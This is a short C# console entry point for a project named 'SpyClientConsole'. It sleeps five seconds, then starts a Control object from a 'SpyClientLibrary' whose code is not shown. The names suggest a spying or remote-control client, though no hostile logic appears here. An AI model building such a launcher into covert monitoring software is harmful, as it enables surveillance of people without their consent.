using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using SpyClientLibrary;
using System.Threading;

namespace SpyClientConsole
{
    class Program
    {
        static void Main(string[] args)
        {
            Thread.Sleep(5000);
            Control controlmanager = new Control();
            controlmanager.StartControl();
           
        }
    }
}
